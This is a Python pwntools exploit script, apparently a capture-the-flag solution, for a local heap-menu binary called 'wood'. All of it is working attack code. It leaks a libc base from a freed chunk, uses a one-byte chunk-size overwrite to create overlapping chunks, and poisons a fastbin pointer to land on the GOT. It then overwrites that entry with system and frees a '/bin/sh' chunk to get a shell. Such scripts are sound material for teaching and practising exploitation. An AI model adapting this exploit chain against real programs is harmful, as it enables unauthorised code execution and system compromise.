#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process('./wood')

elf = ELF('./wood')
libc = ELF('./libc.so.6')
# libc = ELF('/glibc/2.23/32/lib/libc-2.23.so')

def add(size, content):
    io.sendlineafter('choice :', '1')
    io.sendlineafter('nest ?', str(size))
    io.sendafter('nest?', content)


def decorate(index, content):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('dex :', str(index))
    io.sendafter('nest?', content)

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('dex :', str(index))

def crash(index):
    io.sendlineafter('choice :', '4')
    io.sendlineafter('dex :', str(index))

if __name__ =='__main__':
    add(128, 'aaaa') # 0
    add(128, '/bin/sh\x00') # 1
    crash(0)
    raw_input('debug > ')
    add(128, 'aaaaaaaa') # 0
    show(0)
    io.recvuntil('aaaaaaaa')
    info=u64(io.recv(6).ljust(8, '\x00'))
    libcbase = info-0x39bb20-88
    success('libcbase -> {:#x}'.format(libcbase))
    libc.address = libcbase
    success('system -> {:#x}'.format(libc.sym['system']))
    add(0x10, 'cccc') # 2
    add(0x10, 'cccc') # 3
    crash(2)
    crash(3)

    add(0x28, 'dddd') # 2
    add(0x20, 'eeee') # 3
    add(0x50, 'ffff') # 4
    add(0x90, 'gggg') # 5

    decorate(2, 'g'*0x28+'\x91')

    crash(3)
    crash(4)

    # overwrite the next chunk, to change fd
    # no need to reloc funcs now ,so got head can be rewriten
    target = 0x601ffa
    payload = 'h'*0x20+p64(0x30) + p64(0x61) + p64(target)

    add(0x60, payload)
    add(0x50, 'iiii')

    # malloc to the target address
    payload = 'j'*0xe + p64(libc.sym['system'])

    add(0x50, payload)
    crash(1)
        


    io.interactive()
    io.close()
    


